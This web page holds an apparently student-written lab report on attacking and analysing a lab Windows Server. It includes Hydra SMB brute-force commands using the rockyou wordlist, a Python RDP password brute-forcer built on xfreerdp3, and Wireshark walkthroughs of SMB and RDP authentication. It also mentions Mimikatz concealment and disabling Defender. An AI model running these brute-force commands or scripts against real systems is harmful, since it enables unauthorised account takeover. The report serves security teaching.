<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Security test of Windows Server | silly blog</title>
<meta name="keywords" content="windows, it sec, school, red team">
<meta name="description" content="
Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found here along with the bibliography

Testing Windows server security

Laboratory protocol
Exercise 9: Testing Windows server security

     
            Figure: Grouplogo
        


Subject: ITSI
Class: 3AHITN
Name: Stefan Fürst, Justin Tremurici
Group Name/Number: Name here/12
Supervisor: SPAC, ZIVK
Exercise dates: 14.03.2025 | 21.03.2025 | 28.03.2025 | 04.04.2025
Submission date: 11.04.2025

Table of Contents

Task definition
Summary
Complete network topology of the exercise
Exercise Execution

Setting Up the Exercise Environment
Brute-Forcing SMB with Hydra

Analyzing Network Traffic with Wireshark


Brute-Forcing RDP

Explaining My Own RDP Brute-Forcing Script
Analyzing Network Traffic with Wireshark (RDP)


Hardening Windows Against Brute-Force Attacks

Using EvLWatcher for Rate Limiting
Disabling NTLM Authentication
Configuring Login Timeout Settings


Mimikatz: An Introduction

What Can Mimikatz Do?
How to Use Mimikatz


Running Mimikatz

Using Polyglot Files to Conceal Mimikatz
DLL Side-Loading to Attempt to Bypass Windows Defender
How to Detect and Block Mimikatz




References


Task definition
This task was conducted using a combination of manual configuration and automated attack tools to evaluate the security posture of a Windows Server environment. The environment setup involved preparing both the target system and an attacker system running Kali Linux, which was equipped with tools such as Hydra for brute-force attacks and Wireshark for network traffic analysis.">
<meta name="author" content="stefi">
<link rel="canonical" href="http://localhost:1313/posts/itsi/year-3/exercise-9/security-test-of-windows-server/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/itsi/year-3/exercise-9/security-test-of-windows-server/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="silly blog (Alt + H)">silly blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/" title="root">
                    <span>root</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Security test of Windows Server
    </h1>
    <div class="post-meta"><span title='2025-04-11 03:33:09 +0200 CEST'>April 11, 2025</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;stefi

</div>
  </header> 
  <div class="post-content"><blockquote>
<p>Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/Sicherheitstests%20von%20Windows%20Server.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib">bibliography</a></p></blockquote>
<hr>
<h1 id="testing-windows-server-security">Testing Windows server security<a hidden class="anchor" aria-hidden="true" href="#testing-windows-server-security">#</a></h1>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 9: Testing Windows server security<br>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/menthing.png"/> <figcaption>
            Figure: Grouplogo
        </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
<strong>Group Name/Number:</strong> Name here/12<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 14.03.2025 | 21.03.2025 | 28.03.2025 | 04.04.2025<br>
<strong>Submission date:</strong> 11.04.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h2>
<ul>
<li><a href="#task-definition">Task definition</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#complete-network-topology-of-the-exercise">Complete network topology of the exercise</a></li>
<li><a href="#exercise-execution">Exercise Execution</a>
<ul>
<li><a href="#setting-up-the-exercise-environment">Setting Up the Exercise Environment</a></li>
<li><a href="#brute-forcing-smb-with-hydra">Brute-Forcing SMB with Hydra</a>
<ul>
<li><a href="#analyzing-network-traffic-with-wireshark">Analyzing Network Traffic with Wireshark</a></li>
</ul>
</li>
<li><a href="#brute-forcing-rdp">Brute-Forcing RDP</a>
<ul>
<li><a href="#explaining-my-own-rdp-brute-forcing-script">Explaining My Own RDP Brute-Forcing Script</a></li>
<li><a href="#analyzing-network-traffic-with-wireshark-rdp">Analyzing Network Traffic with Wireshark (RDP)</a></li>
</ul>
</li>
<li><a href="#hardening-windows-against-brute-force-attacks">Hardening Windows Against Brute-Force Attacks</a>
<ul>
<li><a href="#using-evlwatcher-for-rate-limiting">Using EvLWatcher for Rate Limiting</a></li>
<li><a href="#disabling-ntlm-authentication">Disabling NTLM Authentication</a></li>
<li><a href="#configuring-login-timeout-settings">Configuring Login Timeout Settings</a></li>
</ul>
</li>
<li><a href="#mimikatz-an-introduction">Mimikatz: An Introduction</a>
<ul>
<li><a href="#what-can-mimikatz-do">What Can Mimikatz Do?</a></li>
<li><a href="#how-to-use-mimikatz">How to Use Mimikatz</a></li>
</ul>
</li>
<li><a href="#running-mimikatz">Running Mimikatz</a>
<ul>
<li><a href="#using-polyglot-files-to-conceal-mimikatz">Using Polyglot Files to Conceal Mimikatz</a></li>
<li><a href="#dll-side-loading-to-attempt-to-bypass-windows-defender">DLL Side-Loading to Attempt to Bypass Windows Defender</a></li>
<li><a href="#how-to-detect-and-block-mimikatz">How to Detect and Block Mimikatz</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition<a hidden class="anchor" aria-hidden="true" href="#task-definition">#</a></h2>
<p>This task was conducted using a combination of manual configuration and automated attack tools to evaluate the security posture of a Windows Server environment. The environment setup involved preparing both the target system and an attacker system running Kali Linux, which was equipped with tools such as Hydra for brute-force attacks and Wireshark for network traffic analysis.</p>
<p>Initially, the target Windows Server was configured by creating a new local user account named <code>testuser</code> with the password <code>passwort</code>. A network share was created using <code>New-SmbShare</code>, and permissions were assigned to <code>testuser</code> to grant access. Concurrently, Wireshark was deployed on either the server or an intermediary device to capture and analyze traffic related to the attacks.</p>
<p>To simulate credential-based attacks, Hydra was used to conduct brute-force attempts on the SMB protocol:</p>
<pre tabindex="0"><code>hydra -l testuser -P /path/to/passwordlist.txt smb://&lt;IP-ADDRESS&gt;
</code></pre><p>The time to successful login was measured and compared between weak (e.g., <code>passwort</code>) and strong (e.g., <code>P@ssw0rd123!</code>) password configurations. Network traffic was captured and filtered using the expression <code>tcp.port == 445</code>, enabling detailed inspection of failed and successful authentication attempts.</p>
<p>A second brute-force attack was executed against the Remote Desktop Protocol (RDP). RDP was enabled through system settings, and <code>testuser</code> was added to the <code>Remote Desktop Users</code> group. Hydra was again utilized for this. Wireshark was used to capture the RDP traffic (<code>tcp.port == 3389</code>) for comparison against the SMB-based attack. Observations highlighted protocol-level differences in how failed and successful login attempts were processed and exposed.</p>
<p>Following the attacks, two mitigation techniques were researched and implemented to harden the system. Group Policy Objects (GPOs) were configured to enforce account lockout policies and limit RDP access. These changes were validated by re-running attacks and observing reduced effectiveness due to increased security controls.</p>
<p>Additionally, privilege escalation techniques were examined using Mimikatz. Requirements for successful execution were researched, including necessary privileges and system policies. As a bonus, Mimikatz was tested on the server to extract credentials and security tokens. The analysis revealed sensitive credential information, underscoring the importance of disabling credential caching and applying strict administrative controls.</p>
<hr>
<h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<p>In this exercise, we used <code>Hydra</code> for brute-force attacks on various services. However, due to issues with Hydra&rsquo;s support for RDP brute-forcing, we created a custom Python script that utilized the <code>FreeRDP</code> command to perform the RDP brute-force attacks. This solution allowed us to bypass the limitations of Hydra and simulate RDP credential stuffing attacks effectively.</p>
<p>To enhance the security of the target system, we adjusted Group Policy settings, specifically disabling <code>NTLM</code> authentication and modifying account lockout policies. These changes were intended to limit the success of brute-force attacks by reducing the number of login attempts allowed.</p>
<p>We also deployed <code>EvWatcher</code> to monitor and limit attack attempts, ensuring that further malicious actions would be detected and blocked. For privilege escalation, we used <code>MSHTA</code> in combination with an MP3 file to bypass security and deploy <code>Mimikatz</code> onto the target system. To ensure <code>Mimikatz</code> could function, we disabled Windows Defender.</p>
<p><code>Mimikatz</code> is a powerful tool used to extract credentials, manipulate security tokens, and perform privilege escalation on Windows systems. It can dump plaintext passwords, password hashes, and Kerberos tickets from memory, providing an attacker with sensitive information. This exercise highlighted the importance of securing systems against such attacks by using strong policies, disabling insecure protocols like <code>NTLM</code>, and employing endpoint protection to prevent tools like <code>Mimikatz</code> from successfully exploiting the system.</p>
<hr>
<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise<a hidden class="anchor" aria-hidden="true" href="#complete-network-topology-of-the-exercise">#</a></h2>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/topo.png"/> <figcaption>
            Figure 1: Complete network topology of the exercise
        </figcaption>
</figure>

<hr>
<h2 id="exercise-execution">Exercise Execution<a hidden class="anchor" aria-hidden="true" href="#exercise-execution">#</a></h2>
<h3 id="setting-up-the-exercise-environment">Setting Up the Exercise Environment<a hidden class="anchor" aria-hidden="true" href="#setting-up-the-exercise-environment">#</a></h3>
<p>To meet the initial requirements of this exercise, the script from last time was simplified to create only five test users, along with corresponding security groups. Most randomly generated elements were removed, leaving only three shares on the <code>C:</code> drive. This can be verified in the Computer Management utility under the Users, Shares, and Groups categories, as shown in the figures below.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/user.png"/> <figcaption>
            Figure 2: Verifying the creation of the users
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/groups.png"/> <figcaption>
            Figure 3: Verifying the creation of the groups
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/shares.png"/> <figcaption>
            Figure 4: Verifying the creation of the shares
        </figcaption>
</figure>
</p>
<hr>
<h3 id="brute-forcing-smb-with-hydra">Brute-Forcing SMB with Hydra<a hidden class="anchor" aria-hidden="true" href="#brute-forcing-smb-with-hydra">#</a></h3>
<p>Since part of the setup involved assigning weak passwords to the users, they can be easily brute-forced with Hydra using the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>hydra -l user1 -P /usr/share/wordlists/rockyou.txt -t <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">192.168</span>.56.102 smb2 -I
</span></span></code></pre></div><p>This command consists of the <code>-l</code> flag to specify the user to target, and the <code>-P</code> flag to specify the list of passwords to use—in this case, the RockYou wordlist. Note that <code>-P</code> (uppercase) indicates a list of passwords, whereas <code>-p</code> (lowercase) is used for a single password. The <code>-t</code> flag sets the number of threads to use for the attack. <code>192.168.56.102</code> sets the target IP address, and <code>smb2</code> specifies the protocol to use. The <code>-I</code> flag tells Hydra to ignore restoring progress from an earlier session.</p>
<p>After running the command, we can see that <code>password123_</code> is not a secure password, as it gets cracked in just one second.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/hydrasmb.png"/> <figcaption>
            Figure 5: Obtaining the password for the smb share
        </figcaption>
</figure>

<hr>
<h4 id="analyzing-network-traffic-with-wireshark">Analyzing Network Traffic with Wireshark<a hidden class="anchor" aria-hidden="true" href="#analyzing-network-traffic-with-wireshark">#</a></h4>
<p>By filtering for <code>tcp.port == 445</code>, we can examine the SMB-related network traffic being sent and received, and analyze the authentication process taking place alongside it.</p>
<ul>
<li>The first SMB packet is sent using version 1 instead of version 2, despite version 2 being specified in the command. This is explained in the SMB specification <!-- raw HTML omitted -->Microsoft Corporation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb1.png"/> <figcaption>
            Figure 6: Inspecting the first Negotiate Protocol Request
        </figcaption>
</figure>

<ul>
<li>The <code>Negotiate Protocol Request</code> informs the server of the SMB dialects (i.e., versions) the client supports, which is essentially an array of supported versions. <!-- raw HTML omitted -->Microsoft Community Hub<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb2.png"/> <figcaption>
            Figure 7: Viewing the Negotiate Protocol Response
        </figcaption>
</figure>

<ul>
<li>The server responds with a <code>Negotiate Protocol Response</code>, replying with the preferred SMB dialect and an array of capabilities. In this case, the server responds with the <code>SMB2 Wildcard</code>, indicating that it supports at least <code>SMB 2.1</code> or a newer version. This prompts the client to send another <code>SMB2 Negotiate Request</code> specifying the exact revision of the SMB 2 protocol to be used.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb3.png"/> <figcaption>
            Figure 8: Viewing the second Negotiate Protocol Request
        </figcaption>
</figure>

<ul>
<li>Now the client responds with its own list of supported capabilities.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb4.png"/> <figcaption>
            Figure 9: Viewing the second Negotiate Protocol Response
        </figcaption>
</figure>

<ul>
<li>
<p>The server follows up by specifying the preferred dialect from the client’s dialect array—which in this case is <code>SMB 3.1.1</code>—and additionally updates the listed capabilities based on the selected version. This version will now be used for the connection.</p>
</li>
<li>
<p>After a dialect and capabilities have been selected, a <code>Session Setup Request</code> is sent, initiating the authentication process using the GSS-API (Generic Security Service Application Program Interface). This is used alongside NTLMSSP, which stands for NT LAN Manager Security Support Provider—a binary messaging protocol developed by Microsoft to facilitate NTLM challenge-response authentication and to negotiate integrity and confidentiality options. <!-- raw HTML omitted -->Wikipedia<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb5.png"/> <figcaption>
            Figure 10: Viewing the Session Setup Request
        </figcaption>
</figure>

<ul>
<li>The server responds with <code>STATUS_MORE_PROCESSING_REQUIRED</code>, indicating that guest access is disabled and authentication is required to connect to this SMB share. <!-- raw HTML omitted -->Microsoft Docs<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb6.png"/> <figcaption>
            Figure 11: Viewing the Session Setup Response
        </figcaption>
</figure>

<ul>
<li>The client sends another <code>Session Setup Request</code> with <code>NTLMSSP_AUTH</code>, including the domain name, user name, and session key.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb7.png"/> <figcaption>
            Figure 12: Viewing the second Session Setup Request
        </figcaption>
</figure>

<ul>
<li>If the authentication fails, the server responds with <code>STATUS_LOGON_FAILURE</code>.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb8.png"/> <figcaption>
            Figure 13: Viewing the second Session Setup Response
        </figcaption>
</figure>

<ul>
<li>If the authentication succeeds, the NT Status field in the header of the <code>Session Setup Response</code> is set to <code>STATUS_SUCCESS</code>. This is followed by a <code>Tree Connect Request</code> to access a share on the server. Since I did not specify a share, Hydra defaults to the administrative share <code>$IPC</code>, which is used to communicate with programs via named pipes over the network. <!-- raw HTML omitted -->Windows OS Hub<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></li>
</ul>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb9.png"/> <figcaption>
            Figure 14: Viewing the successful Session Setup Response
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb10.png"/> <figcaption>
            Figure 15: Viewing the Tree Connect Request
        </figcaption>
</figure>
</p>
<ul>
<li>The <code>Tree Connect Request</code> is followed by a <code>Tree Connect Response</code>, which includes an Access Mask field for the requested share, showing the permissions our user has on this share.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb11.png"/> <figcaption>
            Figure 16: Viewing the Tree Connect Response
        </figcaption>
</figure>

<hr>
<h3 id="brute-forcing-rdp">Brute-Forcing RDP<a hidden class="anchor" aria-hidden="true" href="#brute-forcing-rdp">#</a></h3>
<p><code>RDP</code> is a proprietary protocol developed by Microsoft that allows a user to connect to another computer with a graphical interface. <!-- raw HTML omitted -->Wikipedia<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->Microsoft Docs<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --></p>
<p>However, Hydra did not detect my installation of <code>libfreerdp3</code>, so I created a custom Python RDP brute-forcing script based on the <code>xfreerdp3</code> command.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/hydranordp.png"/> <figcaption>
            Figure 17: Hydra showing that it&#39;s not compiled with freerdp support
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/freerdpnonono.png"/> <figcaption>
            Figure 18: Showing that the libfreerdp3 package is installed but not found
        </figcaption>
</figure>
</p>
<p>Using my script, I can now obtain the credentials and generate a command to connect to the server.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/rdpburteforce.png"/> <figcaption>
            Figure 19: Obtaining the credentials of the user
        </figcaption>
</figure>

<h4 id="explaining-my-own-rdp-brute-forcing-script">Explaining My Own RDP Brute-Forcing Script<a hidden class="anchor" aria-hidden="true" href="#explaining-my-own-rdp-brute-forcing-script">#</a></h4>
<p>The script uses threading and the <code>xfreerdp3</code> command with <code>+auth-only</code> to check credentials. Here is an abstracted version:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess<span style="color:#f92672">,</span> threading<span style="color:#f92672">,</span> argparse<span style="color:#f92672">,</span> concurrent.futures
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>password_found <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Event()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_command</span>(host, user, port, password):
</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;xfreerdp3&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/v:</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/u:</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/p:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;+auth-only&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(cmd, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span>returncode, result<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>strip(), result<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;Error&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">worker</span>(args, passwords):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> pw <span style="color:#f92672">in</span> passwords:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password_found<span style="color:#f92672">.</span>is_set(): <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        code, _, _ <span style="color:#f92672">=</span> run_command(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>user, args<span style="color:#f92672">.</span>port, pw)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> code <span style="color:#f92672">==</span> <span style="color:#ae81ff">131</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SUCCESS: </span><span style="color:#e6db74">{</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            password_found<span style="color:#f92672">.</span>set()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--user&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... other arguments ...</span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pwlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>Password_list) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
</span></span><span style="display:flex;"><span>            pwlist<span style="color:#f92672">.</span>append(line<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>threads <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        worker(args, pwlist)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ...split pwlist and run with ThreadPoolExecutor...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> password_found<span style="color:#f92672">.</span>is_set():
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Password not found&#34;</span>)
</span></span></code></pre></div><hr>
<h4 id="analyzing-network-traffic-with-wireshark-rdp">Analyzing Network Traffic with Wireshark (RDP)<a hidden class="anchor" aria-hidden="true" href="#analyzing-network-traffic-with-wireshark-rdp">#</a></h4>
<p>When inspecting the traffic of an <code>RDP</code> connection, only two RDP requests are sent: a <code>Negotiate Request</code> and a <code>Negotiate Response</code>. The <code>Negotiate Request</code> is used by the client to advertise the supported security protocols.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/rdpneg%20req.png"/> <figcaption>
            Figure 20: Viewing the RDP Negotiate Request
        </figcaption>
</figure>

<p>The server replies with the protocol to use based on the client’s advertisement, which in this case is <code>CredSSP</code> (Credential Security Support Provider). <code>CredSSP</code> provides an encrypted TLS channel, over which the client authenticates using the Simple and Protected Negotiate (SPNEGO) protocol with either Microsoft Kerberos or Microsoft NTLM.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/rdp%20neg%20res.png"/> <figcaption>
            Figure 21: Viewing the RDP Negotiate Response
        </figcaption>
</figure>

<p>After selecting the protocol, a TLS handshake occurs between the client and the server. During this handshake, both parties agree on the TLS version, choose a cipher suite, authenticate the server’s identity via its public key and the digital signature of an SSL certificate authority, and generate session keys in order to use symmetric encryption after the handshake is complete.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/tlshandshake.png"/> <figcaption>
            Figure 22: Viewing the Handshake and Termination of the Connection
        </figcaption>
</figure>

<p>Whether or not the RDP authentication was successful cannot be directly observed, as all communication is wrapped inside encrypted TLS packets, making it appear identical in Wireshark. The only indicator is the amount of application data transmitted, from which it can be inferred whether the client briefly connected for authentication only or simply transmitted credentials over the TLS connection before the authentication failed.</p>
<p>The main difference isn&rsquo;t just the authentication mechanisms (CSPP/TLS vs. GSS-API/NTLMSSP). A crucial distinction is how encryption is handled. RDP can use TLS to encrypt all traffic, including application data, whereas SMB uses GSS-API to negotiate authentication (often using Kerberos or NTLM) and can encrypt SMB packets directly, especially in newer versions (SMB 3.0+). When RDP uses TLS, it creates a TLS tunnel. SMB encryption is integrated within the SMB protocol itself. <!-- raw HTML omitted -->Microsoft Corporation<sup id="fnref1:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->Wikipedia<sup id="fnref1:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
<hr>
<h3 id="hardening-windows-against-brute-force-attacks">Hardening Windows Against Brute-Force Attacks<a hidden class="anchor" aria-hidden="true" href="#hardening-windows-against-brute-force-attacks">#</a></h3>
